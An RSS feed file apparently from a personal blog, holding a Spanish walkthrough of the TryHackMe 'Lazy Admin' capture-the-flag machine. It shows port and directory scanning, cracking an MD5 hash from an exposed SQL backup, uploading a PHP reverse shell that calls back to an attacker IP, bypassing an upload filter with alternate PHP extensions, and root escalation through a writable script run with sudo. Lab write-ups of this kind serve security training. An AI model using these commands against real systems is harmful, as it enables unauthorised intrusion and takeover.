@@ -1,0 +1,322 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>hash md5 on d3b0o</title>
+        <link>https://d3b0o.github.io/tags/hash-md5/</link>
+        <description>Recent content in hash md5 on d3b0o</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Wed, 14 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/tags/hash-md5/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Lazy admin</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/</link>
+        <pubDate>Wed, 14 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/1.jpg" alt="Featured image of post Resolución Lazy admin" /&gt;&lt;p&gt;Máquina fácil Linux para practicar tus habilidades.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/lazyadmin&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/lazyadmin&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.192.128&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.192.128
+PING 10.10.192.128 (10.10.192.128) 56(84) bytes of data.
+64 bytes from 10.10.192.128: icmp_seq=1 ttl=63 time=66.1 ms
+
+--- 10.10.192.128 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 66.057/66.057/66.057/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.192.128 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPorts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.29.188
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p22,80 -sC -sV 10.10.192.128 -Pn target
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 497cf741104373da2ce63s89586f8e0f0 (RSA)
+|   256 2fd7c44ce81b5sa9044dfc0638c72ae55 (ECDSA)
+|_  256 6184622s7c6c32917dd27459e29cb905e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p22,80&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;puerto-80&#34;&gt;Puerto 80&lt;/h3&gt;
+&lt;p&gt;Al entrar a la web lo primero que se ve es lo siguiente&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web.png&#34;
+	width=&#34;1394&#34;
+	height=&#34;914&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web_hud07c474980d2c4951b53048ba51643d1_233644_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/web_hud07c474980d2c4951b53048ba51643d1_233644_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;366px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h4&gt;
+&lt;p&gt;Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;=======================================================================
+ID           Response   Lines    Word       Chars       Payload                         
+=======================================================================
+
+000000075:   301        9 L      28 W       316 Ch      &amp;quot;content&amp;quot;
+000095524:   403        9 L      28 W       278 Ch      &amp;quot;server-status&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-t&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;hc=404&lt;/td&gt;
+&lt;td&gt;Para que no nos reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;FUZZ&lt;/td&gt;
+&lt;td&gt;Se escribe donde quieres aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Dentro de /content solo hay un texto&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content.png&#34;
+	width=&#34;723&#34;
+	height=&#34;228&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content_hu64fb17c600ce79a9e5265150f9c9ccca_33410_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/content_hu64fb17c600ce79a9e5265150f9c9ccca_33410_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;317&#34;
+		data-flex-basis=&#34;761px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Traducción: &lt;em&gt;Bienvenido a SweetRice - Gracias por instalar SweetRice como su sistema de administración de sitios web. Este sitio se está construyendo ahora, por favor llegue tarde. Si usted es el webmaster, vaya a Dashboard -&amp;gt; General -&amp;gt; Configuración del sitio web y desmarque la casilla de verificación &amp;ldquo;Cerrar sitio&amp;rdquo; para abrir su sitio web. Más ayuda en Consejo para Basic CMS SweetRice instalado&lt;/em&gt;&lt;/p&gt;
+&lt;h4 id=&#34;buscando-subdirectorios-en-content&#34;&gt;Buscando subdirectorios en /content/&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.192.128/content/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;=====================================================================
+ID           Response   Lines    Word       Chars       Payload                         
+=====================================================================
+
+000000016:   301        9 L      28 W       323 Ch      &amp;quot;images&amp;quot;
+000000953:   301        9 L      28 W       319 Ch      &amp;quot;js&amp;quot;
+000002190:   301        9 L      28 W       320 Ch      &amp;quot;inc&amp;quot;                           
+000003320:   301        9 L      28 W       319 Ch      &amp;quot;as&amp;quot;                            
+000003601:   301        9 L      28 W       324 Ch      &amp;quot;_themes&amp;quot;                       
+000003808:   301        9 L      28 W       327 Ch      &amp;quot;attachment&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;credenciales-inicio-session&#34;&gt;Credenciales Inicio Session&lt;/h2&gt;
+&lt;p&gt;Dentro del &lt;code&gt;/inc&lt;/code&gt; hay una carpeta llamada &lt;code&gt;mysql_backup/&lt;/code&gt; dentro hay un archivo llamado &lt;code&gt;mysql_bakup_20191129023059-1.5.1.sql&lt;/code&gt; nos lo descargamos, dentro se puede ver un usuario llamado &lt;code&gt;manager&lt;/code&gt; con un hash &lt;code&gt;--------------&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ hash-identifier --------------
+Possible Hashs:
+[+] MD5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para ver el contenido vamos a usar John the Ripper&lt;/p&gt;
+&lt;p&gt;John The Ripper es una herramienta de código abierto para la recuperación y auditoría de seguridad en contraseñas, además de ser multiplataforma, es el más utilizado y versátil, ya que combina una velocidad de “craqueo” rápida, con una extraordinaria gama de tipos de hash compatibles.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+
+Password Censurada      (?)     
+
+1g 0:00:00:00 DONE (2022-12-14 21:28) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s 062089..redlips
+Session completed.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya podemos iniciar sessión en el panel de login que está en /content/as&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login.png&#34;
+	width=&#34;475&#34;
+	height=&#34;552&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login_hudc3ac5b7b238861a7a9c5f13b9a3dcc4_37617_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/login_hudc3ac5b7b238861a7a9c5f13b9a3dcc4_37617_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;86&#34;
+		data-flex-basis=&#34;206px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Con esto entramos a un directorio que parece ser el panel de control del administrador, hay muchos apartados, pero hay uno (&lt;code&gt;media center&lt;/code&gt;) En el cual podemos subir archivos.&lt;/p&gt;
+&lt;h2 id=&#34;reverse-shell&#34;&gt;Reverse shell&lt;/h2&gt;
+&lt;p&gt;Vamos a intentar subir un archivo.php malicioso echo por pentestmonkey para crear una reverse shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Importante cambiar esto con la ip de nuestra máquina y el puerto en el que vamos a estar en escucha&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$ip = &#39;10.10.10.10&#39;;  // CHANGE THIS
+$port = 443;       // CHANGE THIS
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya lo podemos subir&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php.png&#34;
+	width=&#34;700&#34;
+	height=&#34;37&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php_hua92a860ce080c2cecc3020e3d2f1ef90_8935_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/php_hua92a860ce080c2cecc3020e3d2f1ef90_8935_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1891&#34;
+		data-flex-basis=&#34;4540px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;No se ha subido, puede ser que al ser .php lo haya bloqueado&amp;hellip; En estas situaciones, se puede intentar con extensiones menos típicas de php que el admin no haya bloqueado.&lt;/p&gt;
+&lt;p&gt;Ejemplos de alternativas a .php: &lt;code&gt;.php2&lt;/code&gt;, &lt;code&gt;.php3&lt;/code&gt;, &lt;code&gt;.php4&lt;/code&gt;, &lt;code&gt;.php5&lt;/code&gt;, &lt;code&gt;.php6&lt;/code&gt;, &lt;code&gt;.php7&lt;/code&gt;, &lt;code&gt;.phps&lt;/code&gt;, &lt;code&gt;.phps&lt;/code&gt;, &lt;code&gt;.pht&lt;/code&gt;, &lt;code&gt;.phtm&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.pgif&lt;/code&gt;, &lt;code&gt;.shtml&lt;/code&gt;, &lt;code&gt;.htaccess&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt;, &lt;code&gt;.inc&lt;/code&gt;, &lt;code&gt;.hphp&lt;/code&gt;, &lt;code&gt;.ctp&lt;/code&gt;, &lt;code&gt;.module&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Primero vamos a probar con &lt;code&gt;.phtml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml.png&#34;
+	width=&#34;1665&#34;
+	height=&#34;92&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml_hu7bc985ed96d533f4a4391fdc4461188c_11427_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-lazy-admin/images/phtml_hu7bc985ed96d533f4a4391fdc4461188c_11427_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1809&#34;
+		data-flex-basis=&#34;4343px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;¡Ahora si!&lt;/p&gt;
+&lt;p&gt;Nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Clicamos el archivo que hemos subido anteriormente a la web y recibimos la conexión&lt;/p&gt;
+&lt;h2 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h2&gt;
+&lt;p&gt;Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty&amp;hellip;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; se puede ver que podemos ejecutar &lt;code&gt;/usr/bin/perl&lt;/code&gt; y &lt;code&gt;/home/itguy/backup.pl&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Si vamos al &lt;code&gt;/home/itguy/&lt;/code&gt;, y hacemos un cat a &lt;code&gt;backup.pl&lt;/code&gt; se ve que ejecuta un archivo que está en &lt;code&gt;/etc/copy.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;(Contenido backup.pl)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/usr/bin/perl
+
+system(&amp;quot;sh&amp;quot;, &amp;quot;/etc/copy.sh&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este archivo no tenemos permisos de escritura, pero en el copy.sh sí. Vamos a hacer una prueba para ver si lo que ponemos en copy.sh se ejecuta como root&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;www-data@THM-Chal:/$ echo &amp;quot;whoami&amp;quot; &amp;gt; /etc/copy.sh
+www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Efectivamente se ejecuta como root, ahora vamos a decirle al copy.sh que spawnee una bash&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;www-data@THM-Chal:/$ echo &amp;quot;/bin/bash -i&amp;quot; &amp;gt; /etc/copy.sh
+www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl
+root@THM-Chal:/#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;¡Ya somos root!&lt;/p&gt;
+&lt;p&gt;Con un cat /root/root.txt podemos ver la flag&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
